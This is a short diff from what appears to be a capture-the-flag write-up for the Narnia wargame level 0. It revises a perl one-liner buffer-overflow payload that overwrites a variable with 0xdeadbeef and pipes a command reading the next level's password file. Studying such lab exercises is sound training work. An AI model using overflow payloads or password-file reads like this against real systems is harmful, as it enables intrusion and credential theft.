@@ -123,7 +123,7 @@ Still no solution. Now I want to create a situation where the program does somet
 
 Well that was useful, now lets whittle it down so that the /bin/sh command takes the correct input.
 All I should have to do now is remove the extra bytes.
--> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"x1019 . "cat /etc/narnia_pass/narnia1"' | ./narnia0
+-> perl -e 'print "A"x20 . "\xef\xbe\xad\xde" . "B"x4072 . "cat /etc/narnia_pass/narnia1"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
   val: 0xdeadbeef
